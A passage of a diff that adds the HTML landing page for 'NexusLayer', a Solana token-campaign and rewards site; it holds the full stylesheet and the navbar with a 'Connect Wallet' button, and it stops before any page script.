@@ -1,0 +1,1372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>NexusLayer — Decentralized Coordination Layer for Solana</title>
+<meta name="description" content="Access early crypto ecosystem launches, reward campaigns, community quests, and token distributions on Solana."/>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet"/>
+<style>
+/* =============================================
+   NEXUSLAYER — COMPLETE STYLESHEET
+   Theme: Dark · Emerald Green · Silver
+   Fonts: Syne (display) + DM Sans (body)
+============================================= */
+:root {
+  --bg:       #030712;
+  --bg2:      #080e1a;
+  --bg3:      #0d1424;
+  --surface:  rgba(255,255,255,0.04);
+  --surface2: rgba(255,255,255,0.07);
+  --border:   rgba(255,255,255,0.08);
+  --border2:  rgba(255,255,255,0.14);
+  --green:    #10b981;
+  --green2:   #059669;
+  --green3:   #34d399;
+  --gdim:     rgba(16,185,129,0.10);
+  --gborder:  rgba(16,185,129,0.22);
+  --text:     #f1f5f9;
+  --muted:    #64748b;
+  --silver:   #94a3b8;
+  --display:  'Syne', sans-serif;
+  --body:     'DM Sans', sans-serif;
+  --r:        14px;
+  --rl:       20px;
+  --rxl:      28px;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-font-smoothing:antialiased}
+body{font-family:var(--body);background:var(--bg);color:var(--text);overflow-x:hidden;min-height:100vh}
+a{text-decoration:none;color:inherit}
+button{font-family:var(--body);cursor:pointer;border:none}
+img{display:block;max-width:100%}
+::-webkit-scrollbar{width:5px}
+::-webkit-scrollbar-track{background:var(--bg)}
+::-webkit-scrollbar-thumb{background:var(--muted);border-radius:3px}
+::-webkit-scrollbar-thumb:hover{background:var(--green)}
+
+/* ── UTILITY ── */
+.container{max-width:1120px;margin:0 auto;padding:0 28px}
+.gradient-text{background:linear-gradient(135deg,var(--green) 0%,var(--green3) 60%,#6ee7b7 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.section-eyebrow{font-family:var(--display);font-size:10.5px;font-weight:700;letter-spacing:3px;color:var(--green);text-transform:uppercase;margin-bottom:12px}
+.section-h{font-family:var(--display);font-size:clamp(28px,3.8vw,44px);font-weight:800;letter-spacing:-1px;line-height:1.1;margin-bottom:14px}
+.section-sub{font-size:16px;color:var(--silver);line-height:1.7}
+
+/* ── REVEAL ANIMATIONS ── */
+.reveal{opacity:0;transform:translateY(26px);transition:opacity .65s ease,transform .65s ease}
+.reveal.in{opacity:1;transform:none}
+.d1{transition-delay:.08s}.d2{transition-delay:.16s}.d3{transition-delay:.24s}.d4{transition-delay:.32s}
+
+/* ── BUTTONS ── */
+.btn{display:inline-flex;align-items:center;gap:8px;padding:13px 26px;border-radius:var(--r);font-weight:600;font-size:15px;transition:all .22s;cursor:pointer;position:relative;overflow:hidden}
+.btn::after{content:'';position:absolute;inset:0;background:rgba(255,255,255,.08);opacity:0;transition:opacity .2s}
+.btn:hover::after{opacity:1}
+.btn-g{background:linear-gradient(135deg,var(--green),var(--green2));color:#fff;box-shadow:0 4px 22px rgba(16,185,129,.28)}
+.btn-g:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(16,185,129,.38)}
+.btn-g:active{transform:none}
+.btn-o{background:transparent;color:var(--text);border:1.5px solid var(--border2)}
+.btn-o:hover{background:var(--surface2);border-color:rgba(255,255,255,.22);transform:translateY(-2px)}
+.btn-sm{padding:9px 18px;font-size:13px;border-radius:10px}
+.btn-lg{padding:15px 32px;font-size:16px}
+
+/* ── NAVBAR ── */
+.navbar{position:fixed;top:0;left:0;right:0;z-index:900;height:64px;display:flex;align-items:center;padding:0 28px;transition:background .4s,border-color .4s,backdrop-filter .4s;border-bottom:1px solid transparent}
+.navbar.stuck{background:rgba(3,7,18,.88);backdrop-filter:blur(24px) saturate(180%);-webkit-backdrop-filter:blur(24px) saturate(180%);border-bottom-color:var(--border)}
+.nav-inner{width:100%;max-width:1120px;margin:0 auto;display:flex;align-items:center;gap:24px}
+.logo{display:flex;align-items:center;gap:9px;font-family:var(--display);font-weight:800;font-size:18px;letter-spacing:-.5px;flex-shrink:0;color:var(--text)}
+.logo-hex{width:33px;height:33px;border-radius:9px;background:linear-gradient(135deg,var(--green),var(--green2));display:flex;align-items:center;justify-content:center;color:#fff;flex-shrink:0}
+.nav-links{display:flex;gap:2px;flex:1}
+.nl{padding:6px 12px;font-size:13.5px;font-weight:500;color:var(--silver);border-radius:8px;transition:all .2s;white-space:nowrap}
+.nl:hover,.nl.on{color:var(--text);background:var(--surface)}
+.nav-right{display:flex;align-items:center;gap:9px;margin-left:auto}
+.icon-btn{width:34px;height:34px;border-radius:8px;border:1px solid var(--border);background:var(--surface);display:flex;align-items:center;justify-content:center;color:var(--muted);transition:all .2s;cursor:pointer}
+.icon-btn:hover{color:var(--text);border-color:var(--border2);background:var(--surface2)}
+.wallet-nav-btn{display:flex;align-items:center;gap:7px;padding:9px 17px;background:linear-gradient(135deg,var(--green),var(--green2));color:#fff;font-size:13px;font-weight:600;border-radius:10px;cursor:pointer;border:none;box-shadow:0 2px 14px rgba(16,185,129,.22);transition:all .2s;white-space:nowrap}
+.wallet-nav-btn:hover{transform:translateY(-1px);box-shadow:0 4px 20px rgba(16,185,129,.32)}
+.wallet-nav-btn.wc{background:transparent;border:1.5px solid var(--gborder);color:var(--green);box-shadow:none;font-size:12px}
+.wallet-nav-btn.wc:hover{background:var(--gdim)}
+.hamburger{display:none;flex-direction:column;gap:5px;padding:6px;background:none;border:none;cursor:pointer}
+.hamburger span{display:block;width:20px;height:2px;background:var(--text);border-radius:1px;transition:all .3s}
+
+/* ── MOBILE NAV ── */
+.mobile-nav{position:fixed;top:64px;left:0;right:0;background:rgba(3,7,18,.97);backdrop-filter:blur(24px);border-bottom:1px solid var(--border);padding:18px 24px 24px;z-index:850;transform:translateY(-110%);transition:transform .35s cubic-bezier(.4,0,.2,1)}
+.mobile-nav.open{transform:none}
+.mob-link{display:block;padding:13px 0;font-size:16px;font-weight:500;color:var(--silver);border-bottom:1px solid var(--border)}
+.mob-link:last-of-type{border-bottom:none;margin-bottom:16px}
+.mob-link:hover{color:var(--text)}
+
+/* ── HERO ── */
+.hero{position:relative;min-height:100vh;display:flex;align-items:center;justify-content:center;text-align:center;padding:120px 28px 80px;overflow:hidden}
+.hero-bg-glow{position:absolute;top:0;left:50%;transform:translateX(-50%);width:min(1000px,100vw);height:60vh;background:radial-gradient(ellipse at top,rgba(16,185,129,.14) 0%,transparent 65%);pointer-events:none}
+.hero-grid{position:absolute;inset:0;background-image:linear-gradient(rgba(16,185,129,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(16,185,129,.03) 1px,transparent 1px);background-size:70px 70px;pointer-events:none}
+canvas#bgCanvas{position:absolute;inset:0;width:100%;height:100%;pointer-events:none}
+.hero-content{position:relative;z-index:1;max-width:820px}
+.hero-badge{display:inline-flex;align-items:center;gap:8px;background:rgba(16,185,129,.08);border:1px solid var(--gborder);border-radius:999px;padding:6px 16px;font-size:12px;font-weight:600;color:var(--green);letter-spacing:.4px;margin-bottom:28px}
+.bdot{width:7px;height:7px;background:var(--green);border-radius:50%;animation:blink 2.4s ease-in-out infinite}
+.hero-h{font-family:var(--display);font-size:clamp(44px,7.5vw,86px);font-weight:800;line-height:1.05;letter-spacing:-2.5px;margin-bottom:22px}
+.hero-p{font-size:clamp(15px,1.8vw,18px);color:var(--silver);line-height:1.72;margin-bottom:40px;max-width:600px;margin-left:auto;margin-right:auto}
+.hero-btns{display:flex;gap:14px;justify-content:center;flex-wrap:wrap;margin-bottom:44px}
+.hero-proof{display:flex;align-items:center;gap:14px;justify-content:center;flex-wrap:wrap;font-size:13px;color:var(--muted)}
+.proof-item{display:flex;align-items:center;gap:5px}
+.proof-dot{width:4px;height:4px;border-radius:50%;background:var(--muted)}
+.scroll-hint{position:absolute;bottom:32px;left:50%;transform:translateX(-50%);display:flex;flex-direction:column;align-items:center;gap:6px;color:var(--muted);font-size:10px;letter-spacing:2px;text-transform:uppercase}
+.scroll-line{width:1px;height:44px;background:linear-gradient(to bottom,var(--green),transparent);animation:scrollPulse 2s ease-in-out infinite}
+
+/* ── STATS ── */
+.stats-sec{padding:96px 0;position:relative;z-index:1}
+.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px;margin-top:48px}
+.stat-card{background:var(--surface);border:1.5px solid var(--border);border-radius:var(--rl);padding:28px 22px;text-align:center;transition:all .3s;cursor:default;position:relative;overflow:hidden}
+.stat-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--green),transparent);opacity:0;transition:opacity .3s}
+.stat-card:hover{border-color:var(--gborder);transform:translateY(-4px);box-shadow:0 0 40px rgba(16,185,129,.1)}
+.stat-card:hover::before{opacity:1}
+.stat-num{font-family:var(--display);font-size:46px;font-weight:800;line-height:1;margin-bottom:8px;background:linear-gradient(135deg,var(--green),var(--green3));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;display:flex;align-items:baseline;justify-content:center;gap:2px}
+.stat-num sub{font-size:24px;font-weight:800}
+.stat-label{font-size:12.5px;font-weight:600;color:var(--muted);letter-spacing:.3px;margin-bottom:16px}
+.stat-bar-bg{height:3px;background:rgba(255,255,255,.06);border-radius:999px;overflow:hidden}
+.stat-bar-fg{height:100%;background:linear-gradient(90deg,var(--green),var(--green3));border-radius:999px;width:0;transition:width 1.8s ease}
+
+/* ── FEATURES ── */
+.features-sec{padding:96px 0;position:relative;z-index:1}
+.features-sec .center{text-align:center;display:flex;flex-direction:column;align-items:center}
+.features-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:14px;margin-top:52px}
+.feat-card{background:var(--surface);border:1.5px solid var(--border);border-radius:var(--rl);padding:28px;transition:all .32s;cursor:default;position:relative;overflow:hidden}
+.feat-card::after{content:'';position:absolute;inset:0;background:radial-gradient(circle at 80% 0%,rgba(16,185,129,.07),transparent 60%);opacity:0;transition:opacity .32s}
+.feat-card:hover{border-color:rgba(16,185,129,.35);transform:translateY(-5px);box-shadow:0 16px 48px rgba(16,185,129,.08)}
+.feat-card:hover::after{opacity:1}
+.feat-icon{width:50px;height:50px;border-radius:13px;background:var(--gdim);border:1px solid var(--gborder);display:flex;align-items:center;justify-content:center;color:var(--green);margin-bottom:18px}
+.feat-card h3{font-family:var(--display);font-size:16.5px;font-weight:700;margin-bottom:10px}
+.feat-card p{font-size:14px;color:var(--silver);line-height:1.65;margin-bottom:18px}
+.feat-tag{display:inline-block;padding:4px 12px;background:var(--gdim);border:1px solid var(--gborder);border-radius:999px;font-size:10.5px;font-weight:700;color:var(--green);letter-spacing:.5px;text-transform:uppercase}
+
+/* ── MARQUEE ── */
+.marquee-sec{padding:44px 0;border-top:1px solid var(--border);border-bottom:1px solid var(--border);overflow:hidden;position:relative;z-index:1}
+.marquee-label{text-align:center;font-size:10px;font-weight:700;letter-spacing:3px;color:var(--muted);margin-bottom:22px}
+.marquee-wrap{position:relative;overflow:hidden}
+.marquee-wrap::before,.marquee-wrap::after{content:'';position:absolute;top:0;bottom:0;width:100px;z-index:2}
+.marquee-wrap::before{left:0;background:linear-gradient(90deg,var(--bg),transparent)}
+.marquee-wrap::after{right:0;background:linear-gradient(-90deg,var(--bg),transparent)}
+.marquee-track{display:flex;width:max-content;animation:marquee 30s linear infinite}
+.mq-item{padding:9px 22px;margin:0 7px;background:var(--surface);border:1px solid var(--border);border-radius:9px;font-size:13px;font-weight:600;color:var(--muted);white-space:nowrap;transition:all .2s;cursor:default}
+.mq-item:hover{border-color:var(--gborder);color:var(--green)}
+
+/* ── CAMPAIGNS ── */
+.campaigns-sec{padding:96px 0;position:relative;z-index:1}
+.camp-header{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;margin-bottom:38px;flex-wrap:wrap}
+.filters{display:flex;gap:8px;flex-wrap:wrap}
+.filter-btn{padding:8px 18px;background:var(--surface);border:1.5px solid var(--border);border-radius:999px;color:var(--muted);font-size:13px;font-weight:600;cursor:pointer;transition:all .2s;font-family:var(--body)}
+.filter-btn:hover,.filter-btn.active{background:var(--gdim);border-color:var(--gborder);color:var(--green)}
+.camp-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:14px}
+.camp-card{background:var(--surface);border:1.5px solid var(--border);border-radius:var(--rl);padding:22px;transition:all .3s;position:relative;overflow:hidden}
+.camp-card:hover{border-color:rgba(16,185,129,.3);box-shadow:0 10px 36px rgba(16,185,129,.07);transform:translateY(-3px)}
+.camp-top{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:14px;gap:10px}
+.ctag{display:inline-block;padding:3px 10px;border-radius:999px;font-size:10px;font-weight:700;letter-spacing:.4px;text-transform:uppercase;margin-bottom:5px}
+.ctag-defi{background:rgba(16,185,129,.14);color:var(--green)}
+.ctag-nft {background:rgba(139,92,246,.14);color:#a78bfa}
+.ctag-perps{background:rgba(245,158,11,.14);color:#fbbf24}
+.ctitle{font-family:var(--display);font-size:15px;font-weight:700}
+.cstatus{padding:4px 11px;border-radius:999px;font-size:11px;font-weight:700;flex-shrink:0;align-self:flex-start}
+.clive{background:rgba(16,185,129,.12);color:var(--green)}
+.csoon{background:rgba(255,255,255,.06);color:var(--muted)}
+.camp-meta{display:flex;gap:16px;margin-bottom:14px}
+.cmeta-item .cl{font-size:10px;font-weight:700;color:var(--muted);letter-spacing:.4px;margin-bottom:3px}
+.cmeta-item .cv{font-size:14px;font-weight:700;color:var(--text)}
+.cmeta-item .cv.g{color:var(--green)}
+.pbar-wrap{margin-bottom:16px}
+.pbar-head{display:flex;justify-content:space-between;margin-bottom:6px}
+.pbar-head span{font-size:11px;color:var(--muted);font-weight:600}
+.pbar-head .pp{color:var(--green)}
+.pbar-bg{height:4px;background:rgba(255,255,255,.07);border-radius:999px;overflow:hidden}
+.pbar-fg{height:100%;background:linear-gradient(90deg,var(--green),var(--green3));border-radius:999px;transition:width 1.2s ease}
+.cjoin-btn{width:100%;padding:11px;border-radius:10px;font-size:13px;font-weight:700;transition:all .2s;font-family:var(--body)}
+.join-live{background:linear-gradient(135deg,var(--green),var(--green2));color:#fff;border:none;box-shadow:0 4px 14px rgba(16,185,129,.22)}
+.join-live:hover{box-shadow:0 6px 20px rgba(16,185,129,.34);transform:translateY(-1px)}
+.join-done{background:transparent;border:1.5px solid var(--gborder);color:var(--green)}
+.join-notify{background:transparent;border:1.5px solid var(--border2);color:var(--silver)}
+.join-notify:hover{background:var(--surface2)}
+
+/* ── FLOW ── */
+.flow-sec{padding:96px 0;position:relative;z-index:1}
+.flow-sec .center{text-align:center;display:flex;flex-direction:column;align-items:center}
+.flow-row{display:flex;align-items:center;gap:0;margin-top:60px;overflow-x:auto;padding:16px 4px}
+.flow-step{flex:1;min-width:180px;background:var(--surface);border:1.5px solid var(--border);border-radius:var(--rl);padding:28px 20px;text-align:center;transition:all .3s;cursor:default}
+.flow-step:hover{border-color:var(--gborder);transform:translateY(-4px);box-shadow:0 12px 32px rgba(16,185,129,.08)}
+.fnum{font-family:var(--display);font-size:10px;font-weight:800;letter-spacing:2.5px;color:var(--green);margin-bottom:14px}
+.ficon{width:52px;height:52px;border-radius:14px;background:var(--gdim);border:1px solid var(--gborder);display:flex;align-items:center;justify-content:center;color:var(--green);margin:0 auto 16px}
+.flow-step h4{font-family:var(--display);font-size:14.5px;font-weight:700;margin-bottom:8px}
+.flow-step p{font-size:12.5px;color:var(--muted);line-height:1.55}
+.flow-conn{display:flex;align-items:center;padding:0 6px;flex-shrink:0}
+.fconn-arr{color:var(--green);font-size:22px;font-weight:300}
+
+/* ── COMMUNITY ── */
+.community-sec{padding:96px 0;position:relative;z-index:1}
+.community-sec .center{text-align:center;display:flex;flex-direction:column;align-items:center}
+.comm-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:14px;margin-top:52px}
+.comm-card{background:var(--surface);border:1.5px solid var(--border);border-radius:var(--rl);padding:26px;display:flex;align-items:flex-start;gap:16px;transition:all .3s;cursor:pointer}
+.comm-card:hover{transform:translateY(-4px)}
+.comm-ico{width:50px;height:50px;border-radius:13px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.ico-tg{background:rgba(41,169,235,.14);color:#29a9eb}
+.ico-dc{background:rgba(88,101,242,.14);color:#5865F2}
+.ico-tw{background:rgba(255,255,255,.08);color:#e7e9ea}
+.comm-info{flex:1}
+.comm-info h3{font-family:var(--display);font-size:17px;font-weight:700;margin-bottom:3px}
+.comm-cnt{font-size:13px;font-weight:700;margin-bottom:8px}
+.comm-info p{font-size:13.5px;color:var(--muted);line-height:1.55}
+.comm-arr{font-size:20px;color:var(--muted);transition:all .25s}
+.comm-card:hover .comm-arr{transform:translate(2px,-2px)}
+
+/* ── CTA ── */
+.cta-sec{padding:72px 0 96px;position:relative;z-index:1}
+.cta-box{background:linear-gradient(135deg,rgba(16,185,129,.09),rgba(5,150,105,.04));border:1.5px solid var(--gborder);border-radius:var(--rxl);padding:76px 52px;text-align:center;position:relative;overflow:hidden}
+.cta-glow{position:absolute;top:-80px;right:-80px;width:320px;height:320px;border-radius:50%;background:radial-gradient(circle,rgba(16,185,129,.16),transparent 65%);pointer-events:none}
+.cta-glow2{position:absolute;bottom:-80px;left:-80px;width:280px;height:280px;border-radius:50%;background:radial-gradient(circle,rgba(5,150,105,.12),transparent 65%);pointer-events:none}
+.cta-content{position:relative;z-index:1}
+.cta-box h2{font-family:var(--display);font-size:clamp(28px,4vw,48px);font-weight:800;letter-spacing:-1px;margin-bottom:14px}
+.cta-box p{font-size:16px;color:var(--silver);max-width:500px;margin:0 auto 36px;line-height:1.7}
+.cta-btns{display:flex;gap:14px;justify-content:center;flex-wrap:wrap}
+
+/* ── FOOTER ── */
+.footer{padding:70px 0 32px;border-top:1px solid var(--border);position:relative;z-index:1}
+.footer-top{display:grid;grid-template-columns:1.2fr 2fr;gap:64px;margin-bottom:48px}
+.footer-brand .logo{margin-bottom:14px}
+.footer-brand p{font-size:14px;color:var(--muted);line-height:1.7;max-width:300px;margin-bottom:22px}
+.f-socials{display:flex;gap:9px}
+.f-soc{width:36px;height:36px;border-radius:9px;background:var(--surface);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;color:var(--muted);transition:all .2s}
+.f-soc:hover{color:var(--green);border-color:var(--gborder);background:var(--gdim)}
+.footer-links{display:grid;grid-template-columns:repeat(3,1fr);gap:28px}
+.fcol h5{font-family:var(--display);font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--muted);margin-bottom:15px}
+.fcol a{display:block;font-size:14px;color:var(--muted);margin-bottom:10px;transition:color .2s}
+.fcol a:hover{color:var(--green)}
+.footer-bar{height:2px;background:linear-gradient(90deg,transparent,var(--green),var(--green2),transparent);border-radius:1px;margin-bottom:26px;opacity:.55}
+.footer-bottom{display:flex;justify-content:space-between;align-items:center;font-size:13px;color:var(--muted)}
+.sol-badge{font-weight:700;background:linear-gradient(135deg,#9945FF,#14F195);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+
+/* ── MODAL ── */
+.modal-bg{position:fixed;inset:0;background:rgba(0,0,0,.76);backdrop-filter:blur(14px);z-index:2000;display:flex;align-items:center;justify-content:center;padding:20px;opacity:0;pointer-events:none;transition:opacity .3s}
+.modal-bg.show{opacity:1;pointer-events:all}
+.modal{background:#0a1020;border:1.5px solid rgba(255,255,255,.1);border-radius:var(--rxl);width:100%;max-width:430px;padding:28px;box-shadow:0 40px 100px rgba(0,0,0,.55),0 0 60px rgba(16,185,129,.08);transform:scale(.94) translateY(18px);transition:transform .38s cubic-bezier(.34,1.56,.64,1)}
+.modal-bg.show .modal{transform:scale(1) translateY(0)}
+.modal-head{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:24px;gap:12px}
+.modal-title-row{display:flex;align-items:center;gap:13px}
+.modal-icon{width:46px;height:46px;border-radius:13px;background:var(--gdim);border:1px solid var(--gborder);display:flex;align-items:center;justify-content:center;color:var(--green);flex-shrink:0}
+.modal-head h3{font-family:var(--display);font-size:19px;font-weight:700;margin-bottom:3px}
+.modal-head p{font-size:13px;color:var(--muted)}
+.modal-x{width:32px;height:32px;border-radius:8px;background:var(--surface);border:1px solid var(--border);color:var(--muted);display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all .2s;flex-shrink:0}
+.modal-x:hover{background:var(--surface2);color:var(--text)}
+.w-opt{display:flex;align-items:center;gap:13px;padding:14px 15px;background:var(--surface);border:1.5px solid var(--border);border-radius:var(--r);cursor:pointer;transition:all .22s;margin-bottom:10px}
+.w-opt:last-child{margin-bottom:0}
+.w-opt:hover{background:var(--surface2);border-color:var(--border2);transform:translateX(5px)}
+.w-opt-ico{width:46px;height:46px;border-radius:13px;display:flex;align-items:center;justify-content:center;flex-shrink:0;overflow:hidden}
+.w-opt-info{flex:1}
+.w-opt-info strong{display:block;font-size:15px;font-weight:700;margin-bottom:2px}
+.w-opt-info span{font-size:12px;color:var(--muted)}
+.w-opt-info span.detected{color:var(--green)}
+.w-arrow{color:var(--muted);font-size:18px}
+/* Connecting */
+.connecting-state{text-align:center;padding:32px 0}
+.spinner{width:50px;height:50px;border:3px solid rgba(16,185,129,.18);border-top-color:var(--green);border-radius:50%;animation:spin .85s linear infinite;margin:0 auto 20px}
+.conn-text{font-size:15px;font-weight:700;margin-bottom:6px}
+.conn-sub{font-size:13px;color:var(--muted)}
+/* Success */
+.success-state{text-align:center;padding:26px 0}
+.s-check{width:62px;height:62px;border-radius:50%;background:rgba(16,185,129,.12);border:2px solid var(--green);display:flex;align-items:center;justify-content:center;margin:0 auto 16px;animation:popIn .5s cubic-bezier(.34,1.56,.64,1)}
+.s-title{font-family:var(--display);font-size:21px;font-weight:800;margin-bottom:8px}
+.s-addr{display:inline-block;padding:6px 16px;background:var(--gdim);border:1px solid var(--gborder);border-radius:999px;font-size:13px;font-weight:600;color:var(--green);font-family:monospace;margin-bottom:14px}
+.s-sub{font-size:13px;color:var(--muted);margin-bottom:18px}
+.s-prog-bg{height:4px;background:rgba(255,255,255,.08);border-radius:999px;overflow:hidden;margin:0 16px}
+.s-prog-fg{height:100%;background:linear-gradient(90deg,var(--green),var(--green3));border-radius:999px;width:0;animation:progLoad 2.5s ease forwards}
+.modal-foot{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:20px;padding-top:16px;border-top:1px solid var(--border);font-size:11px;color:var(--muted)}
+
+/* ── DASHBOARD PANEL ── */
+.dash-panel{position:fixed;top:64px;right:0;width:360px;background:#090f1e;border-left:1px solid var(--border);border-bottom:1px solid var(--border);border-radius:0 0 0 20px;box-shadow:-12px 12px 50px rgba(0,0,0,.45);z-index:800;transform:translateX(105%);transition:transform .38s cubic-bezier(.4,0,.2,1)}
+.dash-panel.open{transform:none}
+.dash-inner{padding:20px}
+.dash-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px}
+.dash-wallet-row{display:flex;align-items:center;gap:10px}
+.dash-ava{width:38px;height:38px;border-radius:50%;background:linear-gradient(135deg,var(--green),var(--green2));display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;color:#fff;flex-shrink:0}
+.dash-addr{font-family:monospace;font-size:13px;font-weight:600}
+.dash-net{display:flex;align-items:center;gap:5px;font-size:11px;color:var(--green);font-weight:600;margin-top:2px}
+.net-dot{width:6px;height:6px;border-radius:50%;background:var(--green);animation:blink 2s infinite}
+.dash-acts{display:flex;gap:7px;flex-wrap:wrap}
+.d-btn{display:flex;align-items:center;gap:5px;padding:6px 11px;background:var(--surface);border:1px solid var(--border);border-radius:8px;color:var(--muted);font-size:12px;font-weight:600;cursor:pointer;transition:all .2s;font-family:var(--body)}
+.d-btn:hover{background:var(--surface2);color:var(--text)}
+.d-btn.red:hover{border-color:rgba(239,68,68,.3);color:#f87171;background:rgba(239,68,68,.08)}
+.dash-stats{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-bottom:12px}
+.ds-card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:12px 14px}
+.ds-label{font-size:10px;font-weight:700;color:var(--muted);letter-spacing:.4px;margin-bottom:5px}
+.ds-val{font-family:var(--display);font-size:17px;font-weight:700}
+.ds-val.g{color:var(--green)}
+.dash-claim{display:flex;align-items:center;justify-content:space-between;gap:12px;background:var(--gdim);border:1.5px solid var(--gborder);border-radius:11px;padding:14px;margin-bottom:12px}
+.dclaim-amt{font-family:var(--display);font-size:17px;font-weight:800;color:var(--green)}
+.dclaim-sub{font-size:11px;color:var(--muted);margin-top:2px}
+.rep-card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:13px 14px}
+.rep-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
+.rep-top span:first-child{font-size:10px;font-weight:700;color:var(--muted);letter-spacing:.4px}
+.rep-top span:last-child{font-size:12px;font-weight:700;color:var(--green)}
+.rep-bar-bg{height:6px;background:rgba(255,255,255,.07);border-radius:999px;overflow:hidden}
+.rep-bar-fg{height:100%;background:linear-gradient(90deg,var(--green),var(--green3));border-radius:999px;transition:width 1.5s ease}
+
+/* ── TOAST ── */
+.toast{position:fixed;bottom:28px;left:50%;transform:translateX(-50%) translateY(90px);background:#0a1020;border:1.5px solid var(--gborder);color:var(--text);padding:12px 24px;border-radius:999px;font-size:14px;font-weight:600;box-shadow:0 8px 36px rgba(0,0,0,.5),0 0 24px rgba(16,185,129,.1);z-index:5000;transition:transform .4s cubic-bezier(.34,1.56,.64,1),opacity .4s;opacity:0;white-space:nowrap;pointer-events:none}
+.toast.up{transform:translateX(-50%) translateY(0);opacity:1}
+
+/* ── KEYFRAMES ── */
+@keyframes blink{0%,100%{opacity:.5}50%{opacity:1}}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes marquee{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
+@keyframes scrollPulse{0%,100%{opacity:.35}50%{opacity:1}}
+@keyframes popIn{from{transform:scale(.4);opacity:0}to{transform:scale(1);opacity:1}}
+@keyframes progLoad{to{width:100%}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(22px)}to{opacity:1;transform:none}}
+
+/* ── RESPONSIVE ── */
+@media(max-width:900px){
+  .nav-links{display:none}
+  .hamburger{display:flex}
+  .footer-top{grid-template-columns:1fr;gap:40px}
+  .footer-links{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:640px){
+  .hero-h{letter-spacing:-1.5px}
+  .cta-box{padding:48px 24px}
+  .flow-row{flex-direction:column;align-items:stretch}
+  .flow-conn{justify-content:center;padding:4px 0;transform:rotate(90deg)}
+  .dash-panel{width:100%;border-radius:0}
+  .camp-header{flex-direction:column;align-items:flex-start}
+  .footer-links{grid-template-columns:repeat(2,1fr)}
+  .footer-bottom{flex-direction:column;gap:8px;text-align:center}
+}
+</style>
+</head>
+<body>
+
+<!-- ═══ BACKGROUND CANVAS ═══ -->
+<canvas id="bgCanvas" style="position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;opacity:.55"></canvas>
+
+<!-- ═══ NAVBAR ═══ -->
+<nav class="navbar" id="navbar">
+  <div class="nav-inner">
+    <a class="logo" href="#home">
+      <div class="logo-hex">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 2L2 7l10 5 10-5-10-5M2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+      </div>
+      NexusLayer
+    </a>
+
+    <div class="nav-links">
+      <a href="#home"      class="nl on">Home</a>
+      <a href="#ecosystem" class="nl">Ecosystem</a>
+      <a href="#campaigns" class="nl">Campaigns</a>
+      <a href="#rewards"   class="nl">Rewards</a>
+      <a href="#community" class="nl">Community</a>
+      <a href="#"          class="nl">Docs ↗</a>
+    </div>
+
+    <div class="nav-right">
+      <a href="https://t.me" target="_blank" class="icon-btn" title="Telegram">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.447 1.394c-.16.16-.295.295-.605.295l.213-3.053 5.56-5.023c.242-.213-.054-.333-.373-.12l-6.871 4.326-2.962-.924c-.643-.204-.657-.643.136-.953l11.57-4.461c.537-.194 1.006.131.833.94z"/></svg>
+      </a>
+      <a href="https://x.com" target="_blank" class="icon-btn" title="X">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+      </a>
+      <button class="wallet-nav-btn" id="walletNavBtn" onclick="openModal()">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><path d="M1 10h22"/></svg>
+        <span id="walletNavLabel">Connect Wallet</span>
+      </button>
+      <button class="hamburger" id="hamburger" onclick="toggleNav()" aria-label="Menu">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+  </div>
+</nav>
+
+<!-- ═══ MOBILE NAV ═══ -->
+<div class="mobile-nav" id="mobileNav">
